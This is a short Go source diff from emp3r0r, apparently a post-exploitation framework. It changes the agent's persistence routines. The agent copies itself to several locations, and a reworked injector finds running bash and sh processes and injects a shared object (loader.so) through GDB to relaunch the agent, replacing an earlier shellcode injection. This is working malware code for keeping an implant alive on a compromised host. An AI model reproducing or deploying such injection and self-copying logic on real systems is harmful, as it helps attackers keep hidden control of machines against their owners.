@@ -63,7 +63,7 @@ var (
 // SelfCopy copy emp3r0r to multiple locations
 func SelfCopy() {
 	for _, path := range EmpLocations {
-		err := util.Copy(os.Args[0], path)
+		err := CopySelfTo(path)
 		if err != nil {
 			log.Print(err)
 			continue
@@ -197,16 +197,8 @@ func AddCronJob(job string) error {
 	return cmd.Start()
 }
 
-// Inject shellcode into a running process, the shellcode will make sure emp3r0r is alive
-// TODO choose a process to inject into
+// Inject loader.so into running processes, loader.so launches emp3r0r
 func injector() (err error) {
-	// this shellcode forks a process and executes emp3r0r agent
-	// https://github.com/jm33-m0/emp3r0r/blob/master/shellcode/guardian.asm
-	err = util.Copy(os.Args[0], emp3r0r_data.GuardianAgentPath)
-	if err != nil {
-		return
-	}
-
 	// find some processes to inject
 	procs := util.PidOf("bash")
 	procs = append(procs, util.PidOf("sh")...)
@@ -221,7 +213,8 @@ func injector() (err error) {
 				return
 			}
 			log.Printf("Injecting to %s (%d)...", util.ProcCmdline(pid), pid)
-			e := Injector(&emp3r0r_data.GuardianShellcode, pid)
+
+			e := GDBInjectSO(pid)
 			if e != nil {
 				err = fmt.Errorf("%v, %v", err, e)
 			}
